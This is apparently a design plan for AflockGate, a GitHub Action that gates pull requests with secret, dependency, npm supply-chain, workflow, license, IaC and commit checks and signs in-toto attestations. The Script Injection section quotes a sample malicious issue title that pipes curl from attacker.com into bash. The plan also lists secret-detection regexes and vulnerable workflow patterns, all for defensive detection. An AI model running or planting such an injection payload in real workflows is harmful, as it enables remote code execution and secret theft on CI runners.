# AflockGate — Complete Supply Chain Quality Gate Plan

## What We Have Today

```
src/
├── main.ts           # Pipeline orchestration: PR event → checks → attest → comment
├── github.ts         # GitHub REST API: PR context, changed files, diff, PR comment
├── policy.ts         # .aflock.json: allowed/denied file globs, maxChangedFiles, mode
├── diff.ts           # Diff processing, truncation, SHA-256 hashing
├── llm.ts            # LLM code review (mock / OpenAI / Anthropic)
├── schema.ts         # Zod schemas: Policy, LLMReview, ReviewIssue, TestPlanItem
├── output.ts         # Write review.json, evidence.json, attestation.json + PR comment
└── attest/
    ├── sign.ts       # Ed25519 signing (tweetnacl, static key from secret)
    ├── verify.ts     # Ed25519 signature verification
    ├── types.ts      # Attestation, Evidence interfaces (custom format)
    └── canonicalize.ts  # Deterministic JSON serialization for hashing
```

**Current capabilities**:
- GitHub Action triggered on `pull_request` events
- File-level policy enforcement (glob allow/deny, max files, max diff bytes)
- LLM-powered structured code review (blocking/non-blocking/test plan)
- Ed25519 signed attestations binding policy + evidence + review
- PR comment with summary, findings, attestation result
- Advisory or gate mode (fail CI on violations)

**Current gaps** (what the Chainguard screenshot shows that we lack):

| Chainguard PR Check | Category | AflockGate Status |
|---|---|---|
| Orca Security - Infrastructure as Code | IaC scanning | Not built |
| Orca Security - SAST | Static analysis | Not built (LLM is not SAST) |
| Orca Security - Secrets | Secret scanning | Not built (only deny globs) |
| Orca Security - Vulnerabilities | Vuln scanning | Not built |
| cg-chainguard-dev-semgrep | Semgrep rules | Not built |
| semgrep-cloud-platform/scan | Cloud semgrep | Not built |
| Chainguard Enforce - Commit Signing | Commit signature verification | Not built |
| StepSecurity Harden-Runner | CI runner network monitoring | Not built |
| StepSecurity Optional - NPM Cooldown | Package freshness check | Not built |
| StepSecurity Optional - Pwn Request | Workflow vulnerability detection | Not built |
| StepSecurity Required - Compromised Pkgs | Known-bad package detection | Not built |
| StepSecurity Required - Script Injection | Workflow injection detection | Not built |

---

## What We Can Build: The Complete Check Matrix

Every check below produces a structured finding that feeds into the attestation.
Checks are grouped into categories. Each category is a scanner module.

### Category 1: Secret Scanner (`src/scanners/secrets.ts`)

Scans the PR diff content — not filenames, but the actual added/modified lines.

| Check | What It Catches | Severity | Detection Method |
|---|---|---|---|
| AWS Access Key | `AKIA[0-9A-Z]{16}` in code | Critical | Regex |
| AWS Secret Key | AWS secret access key assignments | Critical | Regex |
| GitHub PAT | `ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_` tokens | Critical | Regex |
| GitHub Fine-grained PAT | `github_pat_[A-Za-z0-9_]{82}` | Critical | Regex |
| Private Key PEM | `-----BEGIN (RSA\|EC\|DSA\|OPENSSH) PRIVATE KEY-----` | Critical | Regex |
| Google Cloud Key | `AIza[0-9A-Za-z_-]{35}` | Critical | Regex |
| Slack Token | `xox[bpors]-[A-Za-z0-9-]{10,}` | High | Regex |
| Stripe Key | `sk_live_[A-Za-z0-9]{24,}` | Critical | Regex |
| JWT Token | `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` | High | Regex |
| Database Connection String | `(postgres\|mysql\|mongodb\|redis)://[^\s]{10,}` | High | Regex |
| Generic API Key | `api[_-]?(key\|secret\|token)\s*[:=]\s*['"][^\s'"]{16,}` | Medium | Regex |
| High Entropy String | Long random-looking strings in assignment context | Low | Shannon entropy > 4.5 |
| Custom Org Patterns | User-defined patterns in `.aflock.json` | Configurable | Regex |

**Key design**: Scan only `+` lines from the diff (new/modified content). Redact matches in output — never expose the actual secret in attestations or PR comments. Support allowlists for test files.

### Category 2: Dependency Vulnerability Scanner (`src/scanners/deps.ts`)

Parses lockfiles from the PR to detect newly added or upgraded vulnerable dependencies.

| Check | What It Catches | Severity | Detection Method |
|---|---|---|---|
| Known CVE (Critical) | Dependencies with CVSS >= 9.0 | Critical | OSV.dev API |
| Known CVE (High) | Dependencies with CVSS >= 7.0 | High | OSV.dev API |
| Known CVE (Medium) | Dependencies with CVSS >= 4.0 | Medium | OSV.dev API |
| Known Exploited (KEV) | Dependencies in CISA KEV catalog | Critical | OSV.dev + KEV cross-ref |
| High EPSS | Dependencies with EPSS > 0.7 (70% exploit probability) | High | EPSS API |
| Transitive Vulnerability | Vulnerable dep is indirect (depth > 1) | Adjusted by depth | OSV.dev + lockfile graph |
| New Dependency Added | A brand new dependency was added in this PR | Info | Lockfile diff |
| Dependency Removed | A dependency was removed (may indicate migration) | Info | Lockfile diff |

**Supported lockfiles** (Phase 1):
- `package-lock.json`, `yarn.lock` (npm)
- `go.sum` (Go)
- `requirements.txt`, `poetry.lock`, `uv.lock` (Python)
- `Cargo.lock` (Rust)
- `Gemfile.lock` (Ruby)
- `pom.xml`, `gradle.lockfile` (Java)

**Vulnerability scoring formula**:
```
risk_score = cvss_base × epss_probability × kev_multiplier × depth_factor
where:
  kev_multiplier = 2.0 if in KEV catalog, else 1.0
  depth_factor = 1.0 / (transitive_depth + 1)
```

### Category 3: NPM Supply Chain Checks (`src/scanners/npm-supply-chain.ts`)

Inspired directly by **StepSecurity Required/Optional Checks**.

| Check | What It Catches | Severity | Detection Method |
|---|---|---|---|
| **Compromised Package** | Package version known to be compromised (event-stream, ua-parser-js, etc.) | Critical | Known-compromised database + npm advisories |
| **Package Cooldown** | Package version published within configurable cooldown period (default: 7 days) | High | npm registry `time` metadata |
| **Typosquatting** | Package name suspiciously similar to a popular package | High | Levenshtein distance + popular package list |
| **Install Script** | Package has `preinstall`/`postinstall` scripts | Medium | npm registry metadata |
| **Maintainer Change** | Package maintainer recently changed | Medium | npm registry metadata diff |
| **Low Download Count** | New dependency has very few weekly downloads | Low | npm registry metadata |

**Why this matters**: CVE databases catch known vulnerabilities, but compromised packages (malicious takeovers, typosquatting) are often exploited before any CVE is assigned. The StepSecurity checks specifically address this gap.

**NPM Package Cooldown logic**:
1. Detect new/upgraded npm dependencies from `package-lock.json` diff
2. For each, query `https://registry.npmjs.org/{package}` to get `time` field
3. If the version's publish timestamp is within the cooldown window → flag it
4. This catches attacks where a malicious version is published and consumed within hours

**Compromised Package logic**:
1. Maintain a list of known-compromised package+version combinations (sourced from npm advisories, Socket.dev reports, OpenSSF malicious packages repo)
2. Cross-reference every dependency in the PR against this list
3. Hard block if a match is found

### Category 4: Workflow Security Scanner (`src/scanners/workflows.ts`)

Inspired by **StepSecurity Required Checks** (Script Injection, Pwn Request).

| Check | What It Catches | Severity | Detection Method |
|---|---|---|---|
| **Script Injection** | `${{ github.event.issue.title }}` etc. in `run:` blocks | Critical | AST/regex on workflow YAML |
| **Pwn Request** | `pull_request_target` trigger with checkout of PR head | Critical | Workflow trigger + step analysis |
| **Unpinned Action** | `uses: actions/checkout@main` instead of SHA pin | High | YAML parse of `uses:` lines |
| **Mutable Tag** | `uses: actions/checkout@v4` (tag, not SHA) | Medium | YAML parse of `uses:` lines |
| **Excessive Permissions** | `permissions: write-all` or overly broad permissions | High | YAML parse of `permissions:` |
| **Secrets in Logs** | `echo ${{ secrets.* }}` in run blocks | Critical | Regex on `run:` blocks |
| **Untrusted Action** | Action from an org not in the trusted list | Medium | YAML parse + policy allowlist |
| **Self-hosted Runner Risk** | Workflow runs on `self-hosted` with PR trigger | High | YAML parse |

**Script Injection detail** (the most critical):

GitHub Actions expressions like `${{ github.event.issue.title }}` are template-expanded before the shell runs. An attacker can create an issue with title `"; curl attacker.com/pwn | bash; echo "` and the shell command executes it.

Vulnerable pattern:
```yaml
run: echo "Issue: ${{ github.event.issue.title }}"  # INJECTABLE
```

Safe pattern:
```yaml
run: echo "Issue: $TITLE"
env:
  TITLE: ${{ github.event.issue.title }}  # SAFE: env var, not inline
```

**Pwn Request detail**:

`pull_request_target` runs with the base branch's secrets but can be tricked into checking out the PR's code (which may be from a fork). This gives untrusted code access to secrets.

Vulnerable pattern:
```yaml
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS
```

### Category 5: License Compliance (`src/scanners/licenses.ts`)

| Check | What It Catches | Severity | Detection Method |
|---|---|---|---|
| Strong Copyleft | GPL-2.0, GPL-3.0 dependency added | High | Registry metadata |
| Network Copyleft | AGPL-3.0 dependency added | Critical | Registry metadata |
| Weak Copyleft | LGPL, MPL, EPL dependency added | Medium | Registry metadata |
| Unknown License | Dependency has no detectable license | Medium | Registry metadata |
| License Change | Dependency upgraded and license changed | High | Registry metadata diff |
| Custom Denied | License matches user's deny list | Configurable | Policy config |

### Category 6: IaC Security Scanner (`src/scanners/iac.ts`)

Inspired by **Orca Security - Infrastructure as Code**.

| Check | What It Catches | Severity | Detection Method |
|---|---|---|---|
| Dockerfile: `USER root` | Container runs as root | High | Dockerfile parse |
| Dockerfile: `latest` tag | Unpinned base image | Medium | Dockerfile FROM parse |
| Dockerfile: unsigned base | Base image lacks cosign signature | High | cosign verify |
| Dockerfile: `ADD` remote URL | Fetches remote content at build time | Medium | Dockerfile parse |
| Dockerfile: secrets in `ENV`/`ARG` | Credentials in build args | Critical | Regex on ENV/ARG lines |
| Terraform: public S3 bucket | Storage accessible publicly | Critical | HCL parse |
| Terraform: open security group | 0.0.0.0/0 ingress | High | HCL parse |
| Terraform: no encryption | Resources without encryption enabled | High | HCL parse |
| Helm: privileged container | `securityContext.privileged: true` | Critical | YAML parse |
| Helm: hostNetwork | Container uses host network | High | YAML parse |

### Category 7: Commit Integrity (`src/scanners/commits.ts`)

Inspired by **Chainguard Enforce - Commit Signing**.

| Check | What It Catches | Severity | Detection Method |
|---|---|---|---|
| Unsigned commit | Commit lacks GPG/SSH signature | Medium | Git log + GitHub API |
| Unverified signature | Commit signed but signature unverified by GitHub | High | GitHub API `verified` field |
| Force push detected | Branch was force-pushed since last check | High | GitHub events API |
| Co-author without commit | Someone listed as co-author didn't actually commit | Low | Git log analysis |

### Category 8: CI Runner Security (`src/scanners/runner.ts`)

Inspired by **StepSecurity Harden-Runner**.

| Check | What It Catches | Severity | Detection Method |
|---|---|---|---|
| Network egress monitoring | Unexpected outbound connections during CI | High | DNS/network monitoring (requires runner integration) |
| Actions used audit | List of all actions invoked and their destinations | Info | Workflow + run metadata |
| Artifact tampering | Build outputs modified after creation | Critical | Hash comparison |

**Note**: Full Harden-Runner-style network monitoring requires OS-level integration on the runner (eBPF, DNS proxy, or seccomp). This is the hardest check to build and may be better addressed by integrating with StepSecurity directly. However, the lighter version (auditing actions used + verifying workflow integrity) is fully buildable.

---

## How External Tools Integrate

### Tools AflockGate REPLACES (builds its own)

| External Tool | AflockGate Equivalent | Why Build Our Own |
|---|---|---|
| Orca Secrets | Secret Scanner (Category 1) | Runs in-pipeline, findings go into attestation |
| StepSecurity Script Injection | Workflow Scanner (Category 4) | Same — integrated into attestation chain |
| StepSecurity Pwn Request | Workflow Scanner (Category 4) | Same |
| StepSecurity NPM Compromised | NPM Supply Chain (Category 3) | Same |
| StepSecurity NPM Cooldown | NPM Supply Chain (Category 3) | Same |
| Basic vuln scanning | Dep Scanner (Category 2) | Integrated scoring with CVSS+EPSS+KEV |

### Tools AflockGate INTEGRATES WITH (uses as infrastructure)

| External Tool | Integration Point | How |
|---|---|---|
| **GUAC** | Aggregation backend | AflockGate produces in-toto attestations → GUAC ingests them via collector → GraphQL queries for org-wide risk |
| **cosign** | Signature verification + signing | Verify Dockerfile base images, sign build artifacts, verify at deploy time |
| **Sigstore (Fulcio + Rekor)** | Keyless signing infrastructure | Replace Ed25519 static keys with OIDC-based ephemeral certs + transparency log |
| **OSV.dev** | Vulnerability data source | REST API for CVE/CVSS/EPSS data, queried by Dep Scanner |
| **npm/PyPI/Go registries** | Package metadata source | License info, publish timestamps, maintainer data |
| **Semgrep** (optional) | SAST engine | If user wants deeper static analysis, run semgrep with custom rules and ingest findings into attestation |
| **StepSecurity Harden-Runner** | CI runner monitoring | For network-level monitoring, recommend using alongside AflockGate rather than rebuilding |

### Tools AflockGate LEARNS FROM (design patterns)

| Tool | Pattern We Adopt | Our Implementation |
|---|---|---|
| **gittuf** | Approval attestations in Git refs | Record PR approvals as signed in-toto statements in `refs/aflockgate/` |
| **Witness** | CI step attestation | `aflockgate/witness-step` action wraps commands and attests them |
| **nono-attest** | Config file integrity signing | Sign `.aflock.json` with Sigstore, verify before applying policy |
| **Kusari Inspector** | In-PR feedback with categorized findings | Unified PR comment with all check results, grouped by category |

---

## The Complete Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    PR-TIME: AflockGate Core Action                       │
│                                                                          │
│  SCANNERS (each produces Finding[])                                     │
│  ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌─────────────────────┐  │
│  │ 1. Secrets │ │ 2. Deps    │ │ 3. NPM     │ │ 4. Workflows        │  │
│  │   Scanner  │ │   Scanner  │ │   Supply   │ │   Script Injection  │  │
│  │            │ │   + OSV    │ │   Chain    │ │   Pwn Request       │  │
│  │  Regex +   │ │   + EPSS   │ │   Cooldown │ │   Unpinned Actions  │  │
│  │  Entropy   │ │   + KEV    │ │   Compromis│ │   Excessive Perms   │  │
│  └────────────┘ └────────────┘ └────────────┘ └─────────────────────┘  │
│  ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌─────────────────────┐  │
│  │ 5. License │ │ 6. IaC     │ │ 7. Commit  │ │ 8. LLM Review       │  │
│  │   Check    │ │   Security │ │   Integrity│ │   (existing)        │  │
│  │            │ │   Docker   │ │   Unsigned │ │                     │  │
│  │  Copyleft  │ │   Terraform│ │   Force    │ │  Blocking/NonBlock  │  │
│  │  AGPL/GPL  │ │   Helm     │ │   Push     │ │  Test Plan          │  │
│  └────────────┘ └────────────┘ └────────────┘ └─────────────────────┘  │
│                                                                          │
│  POLICY ENGINE                                                           │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │  .aflock.json (signed with Sigstore, verified before use)        │   │
│  │                                                                   │   │
│  │  mode: "advisory" | "gate"                                       │   │
│  │  per-scanner severity thresholds                                  │   │
│  │  file allow/deny globs                                            │   │
│  │  custom secret patterns                                           │   │
│  │  trusted action orgs                                              │   │
│  │  denied licenses                                                  │   │
│  │  vulnerability severity threshold                                 │   │
│  │  npm cooldown period                                              │   │
│  │  cosign trusted issuers                                           │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  GATE DECISION                                                           │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │  Aggregate all findings → apply severity thresholds → PASS/FAIL  │   │
│  │                                                                   │   │
│  │  Critical finding in gate mode → CI fails                        │   │
│  │  High finding in gate mode → CI fails (configurable)             │   │
│  │  Advisory mode → report only, never fail CI                      │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  ATTESTATION                                                             │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │  Format:   in-toto v1 Statement + DSSE Envelope                  │   │
│  │  Signing:  Sigstore Fulcio keyless (primary)                     │   │
│  │            Ed25519 static key (fallback for forks/self-hosted)   │   │
│  │  Log:      Rekor transparency log                                │   │
│  │  Storage:  GitHub Artifacts | OCI Registry | Git ref             │   │
│  │                                                                   │   │
│  │  Attestation binds:                                               │   │
│  │    policy digest + all scanner findings + gate decision           │   │
│  │    + PR metadata + commit SHA + timestamp                        │   │
│  │  Tamper any part → signature invalid                             │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  OUTPUT                                                                  │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │  PR Comment:                                                      │   │
│  │  ┌─────────────────────────────────────────────────────────────┐ │   │
│  │  │ ## AflockGate Quality Gate: PASS ✓                          │ │   │
│  │  │                                                              │ │   │
│  │  │ ### Secrets ✓                                                │ │   │
│  │  │ No secrets detected in 12 changed files                     │ │   │
│  │  │                                                              │ │   │
│  │  │ ### Dependencies                                             │ │   │
│  │  │ ⚠ 1 medium vulnerability: lodash@4.17.20 (CVE-2021-23337)  │ │   │
│  │  │ ✓ No compromised packages                                   │ │   │
│  │  │ ✓ No packages within cooldown period                        │ │   │
│  │  │                                                              │ │   │
│  │  │ ### Workflows ✓                                              │ │   │
│  │  │ No script injection or Pwn Request vulnerabilities           │ │   │
│  │  │                                                              │ │   │
│  │  │ ### Licenses ✓                                               │ │   │
│  │  │ 3 new dependencies, all permissive (MIT, Apache-2.0)        │ │   │
│  │  │                                                              │ │   │
│  │  │ ### Attestation: SIGNED (Sigstore keyless)                  │ │   │
│  │  │ Mode: gate | Rekor entry: 12345678                          │ │   │
│  │  └─────────────────────────────────────────────────────────────┘ │   │
│  │                                                                   │   │
│  │  Artifacts: review.json, evidence.json, attestation.sigstore.json│   │
│  │  GitHub Check: pass/fail status                                  │   │
│  └──────────────────────────────────────────────────────────────────┘   │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  BUILD-TIME: aflockgate/witness-step Action                              │
│                                                                          │
│  Wraps each CI step with attestation:                                   │
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │  - name: Build                                                   │   │
│  │    uses: aflockgate/witness-step@v1                              │   │
│  │    with:                                                          │   │
│  │      step: build                                                  │   │
│  │      command: npm run build                                       │   │
│  │      product-include-glob: "dist/**"                             │   │
│  │                                                                   │   │
│  │  - name: Test                                                     │   │
│  │    uses: aflockgate/witness-step@v1                              │   │
│  │    with:                                                          │   │
│  │      step: test                                                   │   │
│  │      command: npm test                                            │   │
│  │                                                                   │   │
│  │  - name: Publish                                                  │   │
│  │    uses: aflockgate/witness-step@v1                              │   │
│  │    with:                                                          │   │
│  │      step: publish                                                │   │
│  │      command: docker push ghcr.io/org/app:$SHA                   │   │
│  │      cosign-sign: true    # signs the image after push           │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  Each step produces: in-toto attestation with materials + products      │
│  Signed with Sigstore keyless, logged in Rekor                          │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  DEPLOY-TIME: aflockgate/verify-pipeline Action                          │
│                                                                          │
│  Verification checklist before deployment:                               │
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │  1. ✓ PR review attestation exists           (cosign verify)    │   │
│  │  2. ✓ No critical vulns in scan findings     (attestation data) │   │
│  │  3. ✓ No secrets detected                    (attestation data) │   │
│  │  4. ✓ License compliance passed              (attestation data) │   │
│  │  5. ✓ No compromised packages                (attestation data) │   │
│  │  6. ✓ Build step attestation exists          (cosign verify)    │   │
│  │  7. ✓ Test step attestation exists, exit=0   (cosign verify)    │   │
│  │  8. ✓ Container image signed                 (cosign verify)    │   │
│  │  9. ✓ Base images verified                   (cosign verify)    │   │
│  │ 10. ✓ .aflock.json integrity verified        (Sigstore bundle)  │   │
│  │ 11. ✓ Required approvals attested            (GitHub App)       │   │
│  │                                                                   │   │
│  │  Result: DEPLOY_ALLOWED / DEPLOY_BLOCKED                         │   │
│  │  + meta-attestation of the gate decision itself                  │   │
│  └──────────────────────────────────────────────────────────────────┘   │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  GUAC: Organizational Intelligence Layer                                 │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                                                                  │    │
│  │  INGEST (what AflockGate feeds into GUAC):                      │    │
│  │  ├── PR review attestations (in-toto, predicateType: review/v1) │    │
│  │  ├── Build step attestations (in-toto, predicateType: step/v1)  │    │
│  │  ├── Approval attestations (in-toto, predicateType: approval/v1)│    │
│  │  ├── cosign image signatures (DSSE)                              │    │
│  │  ├── SBOMs generated during build (CycloneDX)                   │    │
│  │  └── Vulnerability scan results (OSV format)                     │    │
│  │                                                                  │    │
│  │  QUERY (what you can ask GUAC):                                  │    │
│  │  ├── "Which repos are affected by CVE-2024-XXXX?"              │    │
│  │  ├── "Show PRs merged without passing quality gate this month"  │    │
│  │  ├── "What's the license risk across our 200 repos?"           │    │
│  │  ├── "Trace container image → build → test → PR → commit"      │    │
│  │  ├── "Which artifacts lack build provenance?"                   │    │
│  │  └── "Show me all dependencies added < 7 days after publish"   │    │
│  │                                                                  │    │
│  │  GUAC does NOT run in AflockGate. It runs as separate infra.    │    │
│  │  AflockGate → produces attestations → GUAC ingests via collector│    │
│  │  AflockGate → queries GUAC at deploy-time for policy decisions  │    │
│  │                                                                  │    │
│  └─────────────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Policy Configuration: `.aflock.json` (Complete Schema)

```json
{
  "mode": "gate",

  "filePolicy": {
    "allowedFileGlobs": ["src/**", "tests/**", "docs/**"],
    "deniedFileGlobs": ["**/.env", "**/*.pem", "**/*.key"],
    "maxChangedFiles": 50,
    "maxDiffBytes": 250000
  },

  "secrets": {
    "enabled": true,
    "severityThreshold": "high",
    "allowFiles": ["**/*.test.ts", "**/*.example"],
    "customPatterns": [
      { "name": "internal-token", "regex": "MYORG_[A-Z0-9]{32}", "severity": "critical" }
    ]
  },

  "dependencies": {
    "enabled": true,
    "severityThreshold": "high",
    "ecosystems": ["npm", "go", "pypi"],
    "ignoreVulns": ["GHSA-xxxx-yyyy"],
    "npmSupplyChain": {
      "cooldownDays": 7,
      "checkCompromised": true,
      "checkTyposquatting": true,
      "checkInstallScripts": true
    }
  },

  "licenses": {
    "enabled": true,
    "denied": ["AGPL-3.0", "GPL-3.0"],
    "warnOn": ["LGPL-2.1", "MPL-2.0"],
    "allowUnknown": false
  },

  "workflows": {
    "enabled": true,
    "requirePinnedActions": true,
    "trustedOrgs": ["actions", "github", "google-github-actions"],
    "checkScriptInjection": true,
    "checkPwnRequest": true,
    "checkExcessivePermissions": true
  },

  "iac": {
    "enabled": false,
    "dockerfile": {
      "requireUserNonRoot": true,
      "requirePinnedBaseImage": true,
      "verifyBaseImageSignature": true
    },
    "terraform": { "enabled": false },
    "helm": { "enabled": false }
  },

  "commits": {
    "requireSigned": false,
    "detectForcePush": true
  },

  "cosign": {
    "verifyBaseImages": true,
    "trustedIssuers": ["https://token.actions.githubusercontent.com"],
    "trustedIdentities": {}
  },

  "attestation": {
    "format": "intoto-v1",
    "signing": "sigstore",
    "sigstoreFallback": "ed25519",
    "storage": "artifact",
    "rekorLog": true
  },

  "pipeline": {
    "requiredSteps": ["review", "build", "test"],
    "cosignSignArtifacts": true
  },

  "llm": {
    "provider": "anthropic",
    "model": "claude-sonnet-4-20250514"
  }
}
```

---

## Implementation Priority (Final)

| # | What | Prod Pain It Solves | Effort | New Files |
|---|---|---|---|---|
| **1** | **Secret Scanner** | Credential leaks in PRs | 2-3 days | `src/scanners/secrets.ts` |
| **2** | **Dependency Scanner + OSV** | Merging vulnerable deps | 3-4 days | `src/scanners/deps.ts`, lockfile parsers |
| **3** | **NPM Supply Chain Checks** | Compromised packages, cooldown, typosquatting | 2-3 days | `src/scanners/npm-supply-chain.ts` |
| **4** | **Workflow Security Scanner** | Script injection, Pwn request, unpinned actions | 2-3 days | `src/scanners/workflows.ts` |
| **5** | **License Checker** | Copyleft license violations | 1-2 days | `src/scanners/licenses.ts` |
| **6** | **in-toto Attestation Format** | Interop with GUAC/Witness/cosign ecosystem | 3-4 days | `src/attest/intoto.ts`, `src/attest/dsse.ts` |
| **7** | **Sigstore Keyless Signing** | Eliminates key management | 2-3 days | `src/attest/sigstore.ts` |
| **8** | **IaC Scanner (Dockerfile)** | Insecure container configs | 2-3 days | `src/scanners/iac.ts` |
| **9** | **cosign Verification** | Unsigned base images/actions | 2 days | `src/attest/cosign.ts` |
| **10** | **Config Integrity** | Policy tampering attacks | 1-2 days | `src/config/verify.ts` |
| **11** | **Commit Integrity** | Unsigned/force-pushed commits | 1 day | `src/scanners/commits.ts` |
| **12** | **Pipeline + Policy Engine Refactor** | Unified gate decision | 2-3 days | `src/gate/`, updated `main.ts` |
| **13** | **Witness-style Step Attestation** | Build provenance | 3-4 days | `actions/witness-step/` |
| **14** | **GitHub App Mode** | Approval tracking, webhooks | 5-7 days | New server package |
| **15** | **Deploy Verification Gate** | Pre-deploy safety check | 3-4 days | `actions/verify-pipeline/` |
| **16** | **GUAC Integration** | Org-wide risk intelligence | 3-4 days | `src/gate/guac.ts` |

**Total estimated effort**: ~6-8 weeks for a single developer, with items 1-5 deliverable in ~2 weeks.

---

## What This Looks Like in a Real PR (Target State)

Like the Chainguard screenshot, but everything in one system:

```
┌─────────────────────────────────────────────────────────────┐
│ Checks (8)                                                    │
│                                                               │
│ ▼ AflockGate Quality Gate                                    │
│   ✓ AflockGate - Secrets                    passed (2s)      │
│   ✓ AflockGate - Dependencies               passed (4s)      │
│   ✓ AflockGate - NPM Supply Chain           passed (3s)      │
│   ✓ AflockGate - Workflow Security           passed (1s)      │
│   ✓ AflockGate - Licenses                   passed (2s)      │
│   ⚠ AflockGate - IaC (Dockerfile)           warning (2s)     │
│   ✓ AflockGate - Commit Integrity            passed (1s)      │
│   ✓ AflockGate - Attestation                signed (1s)      │
│                                                               │
│ ▼ AflockGate Pipeline                                        │
│   ✓ AflockGate - Build Step Attestation      signed (45s)    │
│   ✓ AflockGate - Test Step Attestation       signed (120s)   │
│   ✓ AflockGate - Image Signature             cosign (3s)     │
└─────────────────────────────────────────────────────────────┘
```

Each check is a status check. Each produces an attestation. All attestations flow into GUAC.
One config file (`.aflock.json`). One platform. Cryptographic proof at every step.
